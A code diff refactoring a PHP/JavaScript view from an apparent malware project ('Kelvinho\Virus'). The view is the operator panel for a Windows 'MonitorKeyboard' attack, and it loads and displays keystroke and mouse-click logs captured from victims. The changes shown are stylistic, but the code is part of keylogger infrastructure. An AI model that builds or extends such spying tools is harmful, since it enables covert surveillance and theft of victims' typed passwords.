@@ -3,9 +3,14 @@
 global $timezone;
 
 /** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $attack */
-/** @var \Kelvinho\Virus\User\User $user */
 
-\Kelvinho\Virus\Singleton\BackgroundAttacks::js($attack); ?>
+/** @var User $user */
+
+use Kelvinho\Virus\Singleton\BackgroundAttacks;
+use Kelvinho\Virus\User\User;
+use function Kelvinho\Virus\map;
+
+BackgroundAttacks::js($attack); ?>
 <script>
     class Event extends BaseEvent {
         constructor(unixTime, name, displayTime) {
@@ -35,14 +40,11 @@ global $timezone;
          */
         renderContentWithCheckValues(forStream, checks) {
             const self = this;
-            if (self.response == null)
-                $.ajax({
-                    url: self.url,
-                    async: false,
-                    success: response => {
-                        self.response = response;
-                    }
-                });
+            if (self.response === null) $.ajax({
+                url: self.url,
+                async: false,
+                success: response => self.response = response
+            });
             let formattedResponse = self.response + "";
             if (!checks[0]) formattedResponse = formattedResponse.replace(/\[left]/g, "").replace(/\[up]/g, "").replace(/\[right]/g, "").replace(/\[down]/g, "");
             if (!checks[1]) formattedResponse = formattedResponse.replace(/\[left click]/g, "").replace(/\[right click]/g, "").replace(/\[middle click]/g, "");
@@ -57,9 +59,7 @@ global $timezone;
         }
 
         export() {
-            return JSON.stringify({
-                "name": this.name
-            });
+            return JSON.stringify({"name": this.name});
         }
 
         getName() {
@@ -81,9 +81,7 @@ global $timezone;
     }
 
     /** @type {Object.<number, BaseEvent>} */
-    const events = {<?php echo implode(", ", \Kelvinho\Virus\map($attack->getEvents(), function ($name, int $unixTime) use ($user, $timezone) {
-            return "$unixTime: new Event($unixTime, \"$name\", \"" . $timezone->display($user->getTimezone(), $unixTime) . "\")";
-        })); ?>};
+    const events = {<?php echo implode(", ", map($attack->getEvents(), fn($name, int $unixTime) => "$unixTime: new Event($unixTime, \"$name\", \"" . $timezone->display($user->getTimezone(), $unixTime) . "\")")); ?>};
     const context = setupBackgroundAttacksJs(events, [<?php echo implode(", ", $attack->getSavedEvents()); ?>].reverse());
 
     context.streamChange = () => {
